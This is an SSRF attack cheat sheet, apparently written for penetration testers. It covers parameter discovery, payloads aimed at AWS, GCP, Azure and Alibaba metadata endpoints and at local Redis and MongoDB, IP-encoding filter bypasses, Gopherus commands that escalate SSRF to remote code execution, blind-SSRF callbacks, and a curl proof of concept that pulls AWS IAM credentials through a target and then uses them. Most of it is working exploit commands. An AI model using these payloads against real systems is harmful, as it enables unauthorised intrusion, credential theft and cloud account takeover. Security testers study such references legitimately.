# SSRF — Server-Side Request Forgery

**CWE:** CWE-918 | **OWASP:** A10:2021

---

## Finding SSRF Parameters

```bash
# Common vulnerable parameters
url=, image=, link=, src=, dest=, proxy=, path=, host=,
fetch=, load=, callback=, redirect=, uri=, page=, data=

# Find in Wayback URLs
cat all_urls.txt | grep -iE "(url|image|link|src|dest|proxy|fetch|load)="

# Test with Burp Collaborator / interactsh
interactsh-client   # generates unique URL
```

---

## Basic Payloads

```bash
# Internal metadata (cloud environments)
http://169.254.169.254/latest/meta-data/                    # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/         # GCP (needs header)
http://169.254.169.254/metadata/instance?api-version=2021   # Azure
http://100.100.100.200/latest/meta-data/                    # Alibaba Cloud

# Local services
http://localhost/admin
http://127.0.0.1:8080
http://0.0.0.0:6379        # Redis
http://127.0.0.1:27017     # MongoDB
http://internal.service/

# Bypass filters
http://[::1]/              # IPv6 localhost
http://0/                  # 0 resolves to 127.0.0.1
http://127.1/
http://2130706433/         # Decimal IP for 127.0.0.1
http://017700000001/       # Octal IP for 127.0.0.1
http://0x7f000001/         # Hex IP for 127.0.0.1

# DNS rebinding bypass
# Use rebinder: https://lock.cmpxchg8b.com/rebinder.html
```

---

## SSRF → RCE Escalation (via Gopherus)

```bash
# Gopherus generates gopher:// URLs for internal protocols
python3 gopherus.py --exploit redis       # Redis RCE
python3 gopherus.py --exploit mysql       # MySQL query execution
python3 gopherus.py --exploit memcache    # Memcached injection
python3 gopherus.py --exploit fastcgi     # FastCGI RCE
python3 gopherus.py --exploit smtp        # SMTP abuse

# Example Redis RCE payload
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
```

---

## Blind SSRF Detection

```bash
# Always use out-of-band detection for blind SSRF
# 1. Get a Burp Collaborator / interactsh URL
interactsh-client

# 2. Inject as SSRF payload
url=http://YOUR-INTERACTSH-URL.oast.fun

# 3. Wait for DNS/HTTP callback
# If you receive a callback → Blind SSRF confirmed
```

---

## Cloud Credential Theft PoC

```bash
# AWS — get IAM credentials
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: {"role": "ec2-role"}
curl "http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
# Response: {"AccessKeyId":"...", "SecretAccessKey":"...", "Token":"..."}

# Use credentials
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
aws s3 ls
aws iam get-user
```

---

## Severity

| Scenario | Severity |
|----------|----------|
| Cloud credential theft | Critical |
| Internal service access → RCE | Critical |
| Internal admin panel access | High |
| Port scanning internal network | High |
| Blind SSRF (DNS only) | Medium |
| SSRF to external IPs only | Low |
